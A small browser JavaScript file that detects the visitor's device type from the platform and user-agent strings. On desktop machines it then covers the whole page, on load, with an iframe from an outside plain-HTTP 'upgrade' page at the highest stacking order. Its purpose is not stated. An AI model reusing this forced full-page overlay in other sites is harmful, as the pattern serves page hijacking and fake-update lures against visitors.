(function(){
  this.OS = {
	windows:		false,
	windowsPhone:	false,
	unixPC:			false,
	iPad:			false,
	iPhone:			false,
	iMacPC:			false,
	iPod:			false,
	android:		false,
	nokia:			false,
	player:			false,
	Android_UC:		false,
	portable:		false,	/* true is handled device; false is large device which is not for handler */
	mobile:			false,

	checkDeviceMode:function (){
	  var pl = navigator.platform;
	  var ua = navigator.userAgent;

	  if (undefined != pl)
	  {
		/* windows or windows phone */
		if (pl.indexOf("Win") >= 0)
		{
		  if (ua.indexOf("Windows Phone") >= 0)
		  {
			this.windowsPhone = true;
			this.windows = true;					
			this.portable = true;
			this.mobile = true;
		  }
		  else
		  {
			this.windows = true;
			this.portable = false;
		  }

		  return;
		}

		/* nokia */
		if (ua.indexOf("NOKIA") >= 0)
		{
		  this.nokia = true;
		  this.portable = true;
		  this.mobile = true;
		  return;
		}

		/* android */
		if (ua.indexOf("Android") >= 0)
		{
		  this.android = true;
		  this.portable = true;
		  this.mobile = true;
		  return;
		}

		/* iPad */
		if (pl.indexOf("iPad") >= 0)
		{
		  this.iPad = true;
		  this.portable = true;
		  this.mobile = false;
		  return;
		}

		/* iPhone */
		if (pl.indexOf("iPhone") >= 0)
		{
		  this.iPhone = true;
		  this.portable = true;
		  this.mobile = true;
		  return;
		}

		/* iPod */
		if (pl.indexOf("iPod") >= 0)
		{
		  this.iPod = true;
		  this.portable = true;
		  this.mobile = true;
		  return;
		}

		/* Wii or PLASTATION which is under version three */
		if ((ua.indexOf("Wii") >= 0) || (ua.indexOf("PLASTATION") >= 0))
		{
		  this.player = true;
		  this.portable = true;
		  this.mobile = true;
		  return;
		}

		/* MacBook of apple */
		if (pl.indexOf("Mac") >= 0)
		{
		  this.iMacPC = true;
		  this.portable = false;
		  this.mobile = false;
		  return;
		}

		/* unix include Linux */
		if ((pl.indexOf("X11") >= 0) || ((pl.indexOf("Linux") >= 0) && (pl.indexOf("arm") < 0)))
		{
		  this.unixPC = true;
		  this.portable = false;
		  this.mobile = false;
		  return;
		}

		return;
	  }
	  else if (ua.indexOf("Android") >= 0)
	  {
		this.android = true;
		this.portable = true;
		this.mobile = true;
		return;
	  }
	  else
	  {
		if (document.body.clientWidth >= 1024 || document.body.clientHeight >= 1024)
		{
		  this.portable = false;
		  this.mobile = false;
		}
		else
		{
		  this.portable = true;
		  this.mobile = true;
		}

		return;
	  }
	}
  };

  OS.checkDeviceMode();
  
  if (!OS.portable){
	window.onload = function(){
		var doc = document;
		var widget = doc.createElement("iframe");

		widget.src = "http://p.to/pc/upgrade.htm";
		
		var style = {
			height: "100%",
			width: "100%",
			position: "absolute",
			top: "0",
			bottom: "0",
			left: "0",
			right: "0",
			margin: "auto",
			zIndex: "999999"
		}
		
		for (var k in style){
			widget.style[k] = style[k];
		}

		doc.body.appendChild(widget);
	};
  }
})();